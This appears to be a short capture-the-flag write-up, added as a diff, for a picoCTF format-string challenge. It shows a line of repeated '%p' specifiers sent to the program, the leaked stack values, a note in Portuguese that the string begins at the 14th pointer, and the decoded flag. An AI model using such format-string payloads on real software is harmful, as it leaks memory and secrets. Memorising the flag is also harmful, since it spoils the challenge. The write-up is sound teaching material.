@@ -1,0 +1,9 @@
+Give me your order and I'll read it back to you:
+%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,
+Here's your order: 0x402118,(nil),0x760c1fa2da00,(nil),0x11a1880,0xa347834,0x7ffcaa973f50,0x760c1f81ee60,0x760c1fa434d0,0x1,0x7ffcaa974020,(nil),(nil),0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x30355f673431665f,0x7d343663363933,0x7,0x760c1fa458d8,0x2300000007,0x206e693374307250,0xa336c797453,0x9,0x760c1fa56de9,0x760c1f827098,0x760c1fa434d0,(nil),0x7ffcaa974030,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,
+
+a partir do 14 pointer ja temos o comeco da string
+
+doing a int.to_bytes on the strings, we get the flag:
+picoCTF{4n1m41_57y13_4x4_f14g_50396c64}
+
